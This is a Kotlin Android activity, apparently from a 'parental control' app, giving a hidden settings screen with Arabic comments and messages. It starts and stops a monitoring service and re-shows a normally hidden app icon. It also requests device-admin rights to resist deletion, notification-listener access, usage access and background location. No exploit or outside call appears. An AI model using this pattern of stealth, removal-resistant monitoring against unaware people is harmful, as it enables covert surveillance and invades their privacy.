package com.example.parentalcontrol

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

/**
 * واجهة الإعدادات المخفية
 * تسمح للمسؤول بإدارة الخدمة، الأذونات، وحالة أيقونة التطبيق
 */
class HiddenSettingsActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_hidden_settings)

        // تشغيل الخدمة
        findViewById<Button>(R.id.btnStartService).setOnClickListener {
            MonitoringForegroundService.start(this)
            Toast.makeText(this, "بدأت خدمة المراقبة", Toast.LENGTH_SHORT).show()
        }

        // إيقاف الخدمة
        findViewById<Button>(R.id.btnStopService).setOnClickListener {
            MonitoringForegroundService.stop(this)
            Toast.makeText(this, "توقفت خدمة المراقبة", Toast.LENGTH_SHORT).show()
        }

        // إظهار الأيقونة
        findViewById<Button>(R.id.btnShowIcon).setOnClickListener {
            StealthManager.showAppIcon(this)
            Toast.makeText(this, "أيقونة التطبيق ظاهرة الآن", Toast.LENGTH_LONG).show()
        }

        // إدارة الأذونات
        findViewById<Button>(R.id.btnPermissions).setOnClickListener {
            checkAndRequestPermissions()
        }
    }

    private fun checkAndRequestPermissions() {
        // 1. صلاحية Device Admin
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
        if (!dpm.isAdminActive(adminComponent)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب لتأمين النظام ضد الحذف")
            startActivity(intent)
            return
        }

        // 2. صلاحية استماع الإشعارات
        if (!AppNotificationListenerService.isPermissionGranted(this)) {
            AppNotificationListenerService.openPermissionSettings(this)
            return
        }

        // 3. صلاحية تتبع لستخدام التطبيقات
        val appUsageTracker = AppUsageTracker(this)
        if (!appUsageTracker.hasPermission()) {
            val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
            startActivity(intent)
            Toast.makeText(this, "الرجاء تفعيل 'الوصول لبيانات الاستخدام' للتطبيق", Toast.LENGTH_LONG).show()
            return
        }

        // 4. صلاحية الموقع (GPS)
        if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            requestPermissions(arrayOf(android.Manifest.permission.ACCESS_FINE_LOCATION, android.Manifest.permission.ACCESS_BACKGROUND_LOCATION), 100)
            return
        }

        Toast.makeText(this, "جميع الأذونات الأساسية مفعلة", Toast.LENGTH_SHORT).show()
    }
}
